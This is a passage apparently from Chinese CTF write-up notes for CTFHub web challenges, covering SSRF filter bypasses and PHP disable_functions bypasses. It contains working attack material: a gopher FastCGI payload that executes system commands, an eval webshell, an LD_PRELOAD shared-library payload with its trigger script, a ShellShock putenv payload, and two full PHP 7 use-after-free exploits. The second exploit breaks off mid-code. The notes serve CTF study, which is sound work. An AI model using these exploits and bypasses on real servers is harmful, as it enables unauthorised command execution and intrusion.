\ngopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\n```\n\n## 16.7 URL Bypass\n\nurl跳转bypass：\n1.利用`?`绕过限制url=https://www.baidu.com?www.xxxx.me\n2.利用`@`绕过限制url=https://www.baidu.com@www.xxxx.me\n3.利用斜杠反斜杠绕过限制\n4.利用`#`绕过限制url=https://www.baidu.com#www.xxxx.me\n5.利用子域名绕过\n6.利用畸形url绕过\n7.利用跳转ip绕过 \n\n> 请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧\n\n给出提示，url参数的值中必须包含有http://notfound.ctfhub.com\n可以采用@，也就是 HTTP 基本身份认证绕过。\nHTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。\n也就是：http://www.xxx.com@www.yyy.com形式\n\n```\n/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php\n```\n\n## 16.8 数字IP Bypass\n\n- IP进制转换：将点分十进制的IP格式转为其他【八进制】【十六进制】等格式\n\n```\nhttp://127.0.0.1  >>>  http://0177.0.0.1/\nhttp://127.0.0.1  >>>  http://2130706433/\nhttp://127.0.0.1  >>>  http://127001/\nhttp://192.168.0.1  >>>  http://3232235521/\nhttp://192.168.1.1  >>>  http://3232235777/\n```\n\n- Enclosed Alphanumerics：由英文字母数字组成的Unicode字符集，位于圆圈，括号或其他未封闭的封闭空间内，或以句号结尾。如下\n\n```\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com\n①②⑦.⓿.⓿.①  >>> 127.0.0.1\n```\n\n- 特殊地址\n\n```\nhttp://0/  # 0.0.0.0可以直接访问到本地\nhttp://127。0。0。1  # 绕过后端正则规则\nhttp://localhost/\n```\n\n> 这次ban掉了127以及172，不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢 \n\n首先看看http://challenge-36ebaf025673bdcd.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php\n\n> hacker! Ban '/127|172|@/'\n\n说过滤了127，172还有@，经过验证， 以下url值也都可以绕过爆出flag\n\n```\nhttp://0x7f000001/flag.php\nhttp://localhost/flag.php\nhttp://2130706433/flag.php\nhttp://0/flag.php\nhttp://localhost/flag.php\n```\n\n## 16.9 302跳转 Bypass\n\n如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，这个时候可以尝试使用302跳转的方式来进行绕过。\n\n**xip.io**\n\nWhat is xip.io?\nxip.io is a magic domain name that provides wildcard DNS\nfor any IP address. Say your LAN IP address is 10.0.0.1.\nUsing xip.io,即以如下规则进行域名解析\n\n    10.0.0.1.xip.io   resolves to   10.0.0.1\n    www.10.0.0.1.xip.io   resolves to   10.0.0.1\n    mysite.10.0.0.1.xip.io   resolves to   10.0.0.1\n    foo.bar.10.0.0.1.xip.io resolves to 10.0.0.1\n\n**短网址**\n\n顾名思义就是在形式上比较短的网址，借助短网址您可以用简短的网址替代原来冗长的网址，让使用者可以更容易的分享链接。\n\n访问短网址会自动跳转到原来冗长的网址，利用短网址这个特性，我们可以绕过URL参数检测的黑名单。\n\n```\n# 短网址工具域名： https://www.985.so/\nhttp://127.0.0.1/flag.php ---> http://r6d.cn/b2mk6\n```\n\n> SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧。\n\n依旧尝试一下http://challenge-5b889e8b9c4e4f67.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php\n\n>  hacker! Ban Intranet IP \n\n它说把`127.0.0.1`都给过滤了，所以用`.xip.io`不行，但用短网址与10.8的某些地址就可以轻松绕过。\n\n## 16.10 DNS重绑定攻击\n\n{% asset_img 后端服务器IP过滤.png 后端服务器IP过滤 %}\n\n根据流程图：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。\n\n但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。\n\n要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL（TTL表示DNS记录在DNS服务器上缓存时间）时间为0，这是为了防止有DNS服务器对第一次的解析结果进行缓存。\n\n完整的DNS重绑定攻击流程为：\n\n1. 服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP\n2. 对于获得的IP进行判断，发现为指定范围IP，则通过验证\n3. 接下来服务器端对URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址\n4. 由于已经绕过验证，所以服务器端返回访问内网资源的内容\n\n设置好两个地址，就会自动生成域名\n\n```\n# 工具域名： https://lock.cmpxchg8b.com/rebinder.html\n# 使用两个IP地址，分别为\n163.177.151.109 # 作用：第一次DNS解析后IP判断在指定范围内（随意一个可访问的公网地址）\n127.0.0.1       # 作用：第二次DNS解析，不用判断直接访问内网flag.php\n\n7f000001.a3b1976d.rbndr.us\n```\n\n抓包，将url改为域名，就得flag。\n\n```\nGET /?url=7f000001.a3b1976d.rbndr.us/flag.php HTTP/1.1\n```\n\n# 17.  Bypass disable_function \n\nPHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用。有四种绕过 disable_functions 的手法：\n\n- 攻击后端组件，寻找存在命令注入的 web 应用常用的后端组件，如ImageMagick 的魔图漏洞、bash 的破壳漏洞等等；\n- 寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；\n- mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通信）；\n- 利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。\n\n在学习php时，发现有许多函数会对网站或系统造成很大危险隐患，常见的危险函数有：\n\n```php\nphpinfo()\n功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。\n危险等级：中\n\npassthru()\n功能描述：允许执行一个外部程序并回显输出，类似于 exec()。\n危险等级：高\n\nexec()\n功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。\n危险等级：高\n\nsystem()\n功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。\n危险等级：高\n\nchroot()\n功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式\nPHP 时才能工作，且该函数不适用于 Windows 系统。\n危险等级：高\n\nscandir()\n功能描述：列出指定路径中的文件和目录。\n危险等级：中\n\nchgrp()\n功能描述：改变文件或目录所属的用户组。\n危险等级：高\n\nchown()\n功能描述：改变文件或目录的所有者。\n危险等级：高\n\nshell_exec()\n功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。\n危险等级：高\n\nproc_open()\n功能描述：执行一个命令并打开文件指针用于读取以及写入。\n危险等级：高\n\nproc_get_status()\n功能描述：获取使用 proc_open() 所打开进程的信息。\n危险等级：高\n\nerror_log()\n功能描述：将错误信息发送到指定位置（文件）。\n安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，\n执行任意命令。\n危险等级：低\n\nini_alter()\n功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。\n具体参见 ini_set()。\n危险等级：高\n\nini_set()\n功能描述：可用于修改、设置 PHP 环境配置参数。\n危险等级：高\n\nini_restore()\n功能描述：可用于恢复 PHP 环境配置参数到其初始值。\n危险等级：高\n\ndl()\n功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。\n危险等级：高\n\npfsockopen()\n功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。\n危险等级：高\n\nsyslog()\n功能描述：可调用 UNIX 系统的系统层 syslog() 函数。\n危险等级：中\n\nreadlink()\n功能描述：返回符号连接指向的目标文件内容。\n危险等级：中\n\nsymlink()\n功能描述：在 UNIX 系统中建立一个符号链接。\n危险等级：高\n\npopen()\n功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。\n危险等级：高\n\nstream_socket_server()\n功能描述：建立一个 Internet 或 UNIX 服务器连接。\n危险等级：中\n\nputenv()\n功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。\n危险等级：高\n```\n\n\n\n## 17.1 LD_PRLOAD\n\nLD_PRELOAD可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。**通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。**一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。\n\n> 我们知道，Linux的用的都是glibc，有一个叫libc.so.6的文件，这是几乎所有Linux下命令的动态链接中，其中有标准C的各种函数。对于GCC而言，默认情况下，所编译的程序中对标准C函数的链接，都是通过动态链接方式来链接libc.so.6这个函数库的。\n\n程序中我们经常要调用一些外部库的函数，以sendmail程序中的geteuid()为例，如果我们有个自定义的geteuid()函数，把它编译成动态库后，通过LD_PRELOAD加载，当程序中调用geteuid()函数时，调用的其实是我们自定义的geteuid()函数。而在PHP中error_log()和mail()函数在传入特定参数时都会调用到sendmail外部程序进而调用外部库的函数geteuid()。\n\n所以我们的思路是：在已获得webshell但被PHP的disable_function禁用了一些危险函数的命令执行的情况下\n\n1. 编写好动态链接库文件并上传到服务器\n2. 编写PHP文件并上传到服务器，内容为：\n   利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径，然后 配合php的某个函数（例如error_log()或mail()函数）去触发运行动态链接库然后执行我们的恶意动态链接库文件\n3. 在浏览器去浏览我们写的PHP文件\n\n例：hcfhub-web进阶-Bypass disable_function-LD_PRLOAD\n\n打开链接页面显示\n\n```php+html\nCTFHub Bypass disable_function —— LD_PRELOAD\n本环境来源于AntSword-Labs\n\n<!DOCTYPE html>\n<html>\n<head>\n    <title>CTFHub Bypass disable_function —— LD_PRELOAD</title>\n</head>\n<body>\n<h1>CTFHub Bypass disable_function —— LD_PRELOAD</h1>\n<p>本环境来源于<a href=\"https://github.com/AntSwordProject/AntSword-Labs\">AntSword-Labs</a></p>\n</body>\n</html>\n<?php\n@eval($_REQUEST['ant']);\nshow_source(__FILE__);\n?>\n```\n\n即在本页面上就放了一句话木马，用蚁剑连接。在根目录发现flag，但打开是空白页面，终端命令执行也不行。还有一个readflag，打开发现是执行显示flag的命令`tac /flag`，终端执行也不行。\n\n> tac命令与cat命令展示内容相反，用于将文件**以行为单位**的反序输出，即第一行最后显示，最后一行先显示，且不能带行输出。 \n\n方法一：用蚁剑插件的LD_PRLOAD模式\n\nhttps://blog.csdn.net/hxhxhxhxx/article/details/112759999?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant\n\n方法二：手工绕过\n\n```http\n//查看禁用了哪些函数\nhttp://challenge-f10324543e937194.sandbox.ctfhub.com:10800/?ant=phpinfo();\n```\n\n发现禁用了mail函数，但没禁用error_log()。所以下面利用error_log()绕过LD_PRLOAD。\n\n```php\nerror_log()函数向服务器错误记录、文件或远程目标发送错误信息。\nerror_log(message,type,destination,headers);\n```\n\n先创建一个havefun.c文件\n\n```c\n#include<stdlib.h>\n#include <stdio.h>        \n#include<string.h> \n \nvoid payload(){\n\tsystem(\"/readflag > /tmp/havefun\");\n    //如果/readflag运行成功将会在/tmp目录下生成一个havefun文件\n    //system(\"tac /flag > /tmp/havefun\");\n}   \n \nint geteuid(){\nif(getenv(\"LD_PRELOAD\") == NULL)\n    return 0;\nunsetenv(\"LD_PRELOAD\");\npayload();\n}\n```\n\n编译成havefun.so文件\n\n```\ngcc -fPIC -shared havefun.c -o havefun.so\n```\n\n将havefun.so文件拖入/tmp目录下，创建一个havefun.php拖入/var/www/html目录下。\n\n```php\n<?php\nputenv(\"LD_PRELOAD=/tmp/havefun.so\");\nerror_log(\"\",1,\"\",\"\");\n//mail(\"\",\"\",\"\",\"\");\n?>\n//因为mail()函数不能用，所以用函数error_log()\n```\n\n现在所有的前提工作都做好了，关键是怎么执行havefun.php让它执行havefun.so再执行/readflag命令。很简单，主页面不是有一个$_REQUEST['ant']吗，我们可以利用文件包含，将havefun.php文件包含在主页面，执行主页面就可执行havefun.php。\n\n```\nhttp://challenge-f10324543e937194.sandbox.ctfhub.com:10800/?ant=include('havefun.php');\n```\n\n执行完后会在/tmp目录下生成一个havefun文件，打开就是flag。\n\n## 17.2 ShellShock\n\n例：hcfhub-web进阶-Bypass disable_function-ShellShock\n\n跟LD_PRLOAD一样的界面，用蚁剑连接即可。发现什么目录都不给我们看，只能看/var/www/html的目录。\n\n方法一：用蚁剑插件的apache_mode_cgi模式\n\n点击开始，自动弹出终端。查找flag。\n\n```\n/readflag\ntac /flag\n```\n\n方法二：手工shellshock\n\n创建一个shell.php文件上传到/var/www/html\n\n```php\n<?php\nputenv(\"PHP_hack=() { :; }; tac /flag > /var/www/html/hack.php\");\n//运行成功的话将会在/var/www/html下生成一个hack.php文件，里面装着flag。因为我们只能看到/var/www/html目录下的东西，所以只能把flag放在这个路径下。\nerror_log(\"\",1,\"\",\"\");\n//mail(\"\",\"\",\"\",\"\");\n//这次没有限制禁用mail(),所以用mail()也可。\n?>\n```\n\n执行shell.php\n\n```\nhttp://challenge-6a758e43b272dbba.sandbox.ctfhub.com:10800/shell.php\n```\n\n发现/var/www/htm目录下会生成一个hack.php。\n\n## 17.3 Apache Mod CGI\n\nCGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程。\n\nMOD_CGI：任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。\n\n例：hcfhub-web进阶-Bypass disable_function-Apache Mod CGI\n\n这个好像只能用插件？跟shellshock套路一样。\n\n## 17.4 PHP-FPM\n\n> 由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.\n> 因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信\n> 但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制：\n>\n> 1. 第一个问题\n>    既然是请求,那么SCRIPT_FILENAME就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.\n> 2. 第二个问题\n>    我们再如何构造fastcgi和控制SCRIPT_FILENAME,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.\n>    那要如何绕过这种限制呢? 我们可以从php.ini入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是auto_prepend_file\n>    auto_prepend_file的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定php://input进行远程文件包含了.这样就可以做到任意命令执行了.\n> 3. 第三个问题\n>    进行过远程文件包含的小伙伴都知道,远程文件包含有allow_url_include这个限制因素的,如果没有为ON的话就没有办法进行远程文件包含,那要怎末设置呢?\n>    FPM是有设置PHP配置项的KEY-VALUE的,PHP_VALUE可以用来设置php.ini,PHP_ADMIN_VALUE则可以设置所有选项.这样就解决问题了。\n\n例：hcfhub-web进阶-Bypass disable_function-PHP-FPM\n\n一样用蚁剑连接，用蚁剑插件fastcgi/php-fpm，地址选择本地的9000端口，点击开始，就会在/var/www/html下生成一个.antproxy.php文件，在蚁剑添加数据，路径加上.antproxy.php，连接成功就可找flag。\n\n## 17.5 GC UAF\n\n方法一：蚁剑插件PHP_GC_UAF\n\n方法二：一样用蚁剑连接，将编写好的exploit.php上传到/var/www/html上。\n\n编写脚本exploit.php\n\n```php\n<?php\n\n# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=72530\n#\n# This exploit should work on all PHP 7.0-7.3 versions\n#\n# Author: https://github.com/mm0r1\n\npwn(\"tac /flag\");#这个写命令\n\nfunction pwn($cmd) {\n    global $abc, $helper;\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    class ryat {\n        var $ryat;\n        var $chtg;\n        \n        function __destruct()\n        {\n            $this->chtg = $this->ryat;\n            $this->ryat = 1;\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if you get segfaults\n\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_repeat('A', 79);\n\n    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}';\n    $out = unserialize($poc);\n    gc_collect_cycles();\n\n    $v = [];\n    $v[0] = ptr2str(0, 79);\n    unset($v);\n    $abc = $out[2][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n\n    exit();\n}\n```\n\n访问以下URL即可出现flag。\n\n```\nhttp://challenge-e2dba0faaf3a8abc.sandbox.ctfhub.com:10800/exploit.php\n```\n\n## 17.6  Json Serializer UAF \n\n方法一：蚁剑插件PHP7_Serializer_UAF\n\n方法二：脚本\n\n```php\n#php版本：\n#7.1 - all versions to date\n#7.2 < 7.2.19 (released: 30 May 2019)\n#7.3 < 7.3.6 (released: 30 May 2019)\n<?php\n\n$cmd = \"tac /flag\";\n\n$n_alloc = 10; # increase this value if you get segfaults\n\nclass MySplFixedArray extends SplFixedArray {\n    public static $leak;\n}\n\nclass Z implements JsonSerializable {\n    public function write(&$str, $p, $v, $n = 8) {\n      $i = 0;\n      for($i = 0; $i < $n; $i++) {\n        $str[$p + $i] = chr($v & 0xff);\n        $v >>= 8;\n      }\n    }\n\n    public function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    public function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    # unable to leak ro segments\n    public function leak1($addr) {\n        global $spl1;\n\n        $this->write($this->abc, 8, $addr - 0x10);\n        return strlen(get_class($spl1));\n    }\n\n    # the real deal\n    public function leak2($addr, $p = 0, $s = 8) {\n        global $spl1, $fake_tbl_off;\n\n        # fake reference zval\n        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted\n        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval\n        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)\n\n        $leak = strlen($spl1::$leak);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n\n        return $leak;\n    }\n\n    public function parse_elf($base) {\n        $e_type = $this->leak2($base, 0x10, 2);\n\n        $e_phoff = $this->leak2($base, 0x20);\n        $e_phentsize = $this->leak2($base, 0x36, 2);\n        $e_phnum = $this->leak2($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = $this->leak2($header, 0, 4);\n            $p_flags = $this->leak2($header, 4, 4);\n            $p_vaddr = $this->leak2($header, 0x10);\n            $p_memsz = $this->leak2($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    public function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = $this->leak2($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = $this->leak2($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = $this->leak2($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = $this->leak2($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    public function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = $this->leak2($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    public function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = $this->leak2($addr);\n            $f_name = $this->leak2($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return $this->leak2($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    public function jsonSerialize() {\n        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;\n\n        $contiguous = [];\n        for($i = 0; $i < $n_alloc; $i++)\n            $contiguous[] = new DateInterval('PT1S');\n\n        $room = [];\n        for($i = 0; $i < $n_alloc; $i++)\n            $room[] = new Z();\n\n        $_protector = $this->ptr2str(0, 78);\n\n        $this->abc = $this->ptr2str(0, 79);\n        $p = new DateInterval('PT1S');\n\n        unset($y[0]);\n        unset($p);\n\n        $protector = \".$_protector\";\n\n        $x = new DateInterval('PT1S');\n        $x->d = 0x2000;\n        $x->h = 0xdeadbeef;\n        # $this->abc is now of size 0x2000\n\n        if($this->str2ptr($this->abc) != 0xdeadbeef) {\n            die('UAF failed.');\n        }\n\n        $spl1 = new MySplFixedArray();\n        $spl2 = new MySplFixedArray();\n\n        # some leaks\n        $class_entry = $this->str2ptr($this->abc, 0x120);\n        $handlers = $this->str2ptr($this->abc, 0x128);\n        $php_heap = $this->str2ptr($this->abc, 0x1a8);\n        $abc_addr = $php_heap - 0x218;\n\n        # create a fake class_entry\n        $fake_obj = $abc_addr;\n        $this->write($this->abc, 0, 2); # type\n        $this->write($this->abc, 0x120, $abc_addr); # fake class_entry\n\n        # copy some of class_entry definition\n        for($i = 0; $i < 16; $i++) {\n            $this->write($this->abc, 0x10 + $i * 8, \n                $this->leak1($class_entry + 0x10 + $i * 8));\n        }\n\n        # fake static members table\n        $fake_tbl_off = 0x70 * 4 - 16;\n        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);\n        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);\n\n        # fake zval_reference\n        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval\n        $this->write($this->abc, $fake_tbl_off + 8, 10); # zval type (reference)\n\n        # look for binary base\n        $binary_leak = $this->leak2($handlers + 0x10);\n        if(!($base = $this->get_binary_base($binary_leak))) {\n            die(\"Couldn't determine binary base address\");\n        }\n\n        # parse elf header\n        if(!($elf = $this->parse_elf($base))) {\n            die(\"Couldn't parse ELF\");\n        }\n\n        # get basic_functions address\n        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {\n            die(\"Couldn't get basic_functions address\");\n        }\n\n        # find system entry\n        if(!($zif_system = $this->get_system($basic_funcs))) {\n            die(\"Couldn't get zif_system address\");\n        }\n        \n        # copy hashtable offsetGet bucket\n        